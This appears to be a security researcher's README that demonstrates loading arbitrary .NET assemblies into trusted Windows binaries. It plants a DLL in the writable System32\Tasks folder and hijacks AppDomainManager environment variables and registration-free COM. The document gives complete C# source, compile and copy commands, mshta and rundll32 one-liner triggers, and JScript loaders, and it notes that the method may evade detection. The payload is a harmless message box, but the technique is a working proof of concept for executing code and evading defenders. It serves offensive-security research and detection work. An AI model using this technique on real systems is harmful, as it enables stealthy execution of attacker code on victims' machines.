# DotNetInjections
Loading Assemblies Into Processes, the All Natural Organic way


## Executing Arbitrary Assemblies In The Context Of Windows Script Hosts

Issue.

By locating an arbitrary assembly in C:\Windows\System32\Tasks or C:\Windows\SysWOW64\Tasks we can load or influence any script hosts or ANY .NET Application in System32.

Other writable folders may include fxstmp

The best candidate for placement, will be a folder below the app you are running, so, system32 may not be writable, but a folder that matches an
assembly name you have control over , that is , writable will be a good candiate.

For example, cscript, wscript, regsvr32, mshta, eventvwr 

This is a design pattern fully supported and documented in the CLR.

As described in [How the Runtime Locates Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies), we can see that probing of the application base can be influenced.

```
The runtime always begins probing in the application's base, which can be either a URL or the application's root directory on a computer. If the referenced assembly is not found in the application base and no culture information is provided, the runtime searches any subdirectories with the assembly name. The directories probed include:

[application base] / [assembly name].dll

[application base] / [assembly name] / [assembly name].dll
```

If we are trying to load a custom assembly into say, `mshta.exe`, we can take advantage of the fact that C:\Windows\System32\Tasks is a globally writable path. We simply place an assembly named `tasks.dll` into either 
`C:\Windows\System32\Tasks` or `C:\Windows\SysWow64\Tasks`.

There are several implications to this. Let me describe two and provide PoC scripts and binaries to demonstrate.

1. We can leverage the environment variables that setup custom Application Domains, 
    https://blogs.msdn.microsoft.com/shawnfa/2005/07/21/setting-up-an-appdomainmanager/
    
2. You can copy files here and execute them by adding an appconfig filr to the writable path. This may eveade detection or analysts, since it is still 
   withing the system path.  xref: [GhostLoader](https://github.com/TheWover/GhostLoader) 

Example:
tasks.cs or fxstmp.cs  
```
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		System.Windows.Forms.MessageBox.Show("AppDomain - KaBoom!");
		// You have more control here than I am demonstrating. For example, you can set ApplicationBase, 
		// Or you can Override the Assembly Resolver, etc...
        return;
    }
}

/*
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs
set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
set COMPLUS_Version=v4.0.30319
copy tasks.dll C:\Windows\System32\Tasks\tasks.dll
copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll


*/

```

Trigger the Payload with a simple one-liner
```

mshta.exe javascript:a=new%20ActiveXObject("System.Object");close();
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";a=new%20ActiveXObject("System.Object");close();

```



tasks.js

```
// Controls the search path for unmanged dlls
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\\Windows\\System32\\Tasks';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';


var o = new ActiveXObject("System.Object"); // Trigger AppDomainManager Load

```

In addition to leveraging the AppDomainMangers to load our assemblies, we can leverage Registration-Free COM to load and create objects.

Putting this together, we can see a complete .NET Assembly that demonstrates both capabilities.

tasks.cs or fxstmp etc...
```
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

using System.IO;
using System.Reflection;
using System.Runtime.Hosting;


public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		System.Windows.Forms.MessageBox.Show("AppDomain - KaBoom!");
		// You have more control here than I am demonstrating. For example, you can set ApplicationBase, 
		// Or you can Override the Assembly Resolver, etc...
        return;
    }
}

/*
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs
set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
set COMPLUS_Version=v4.0.30319
copy tasks.dll C:\Windows\System32\Tasks\tasks.dll
copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll

Simple One-Liner Triggers.
mshta.exe javascript:a=new%20ActiveXObject("System.Object");close();
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";a=new%20ActiveXObject("System.Object");close();



*/


namespace MyDLL
{
	 
	 [ComVisible(true)]
	 [Guid("31D2B969-7608-426E-9D8E-A09FC9A5ACDC")]
	 [ClassInterface(ClassInterfaceType.None)]
	 [ProgId("MyDLL.Operations")]
	 public class Operations
	 {
		 
		 public Operations()
		 {
			 Console.WriteLine("So It Begins");
		 }
		 
		 [ComVisible(true)]
		 public string getValue1(string sParameter)
		 {
			 switch (sParameter)
			 {
				 case "a":
				 return "A was chosen";

				 case "b":
				 return "B was chosen";

				 case "c":
				 return "C was chosen";

				 default:
				 return "Other";
			}
		}
		 
		 [ComVisible(true)]
		 public string getValue2()
		 {
			return "From VBS String Function";
		 }
		 
		  [ComVisible(true)]
		 public void getValue3()
		 {
					System.Windows.Forms.MessageBox.Show("Hey From My Assembly");

		 }
		 
	 }
}
```


tasks.js
```
// var manifest string should be UTF-16
// Controls the search path for unmanged dlls
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\\Windows\\System32\\Tasks';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';


var o = new ActiveXObject("System.Object"); // Trigger AppDomainManager Load

// Ideally, we create a DLL, drop it anywhere and load it like DynamicWrapper...

// Loads Assembly, but expects it in the C:\Windows\System32 for example for managed code...
// Good news, CLR tries to resolve in sub dir with name of app.  
// Since C:\Windows\system32\tasks is user writable... :) CLR finds and loads our assembly.


var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"><assemblyIdentity name="tasks" type="win32" version="0.0.0.0" /><description>Built with love by Casey Smith @subTee </description><clrClass   name="MyDLL.Operations"   clsid="{31D2B969-7608-426E-9D8E-A09FC9A5ACDC}"   progid="MyDLL.Operations"   runtimeVersion="v4.0.30319"   threadingModel="Both" /><file name="tasks.dll"> </file></assembly>';

var ax = new ActiveXObject("Microsoft.Windows.ActCtx");

ax.ManifestText = manifest;

var dwx = ax.CreateObject("MyDLL.Operations");
//WScript.StdOut.WriteLine(dwx.getValue1("a"));
//WScript.StdOut.WriteLine(dwx.getValue2());
dwx.getValue3() //Trigger Message Box
```

Trigger with cscript.exe tasks.js
Observe Assemmbly execution from AppDomain initialization as well as calling into a method in our custom class
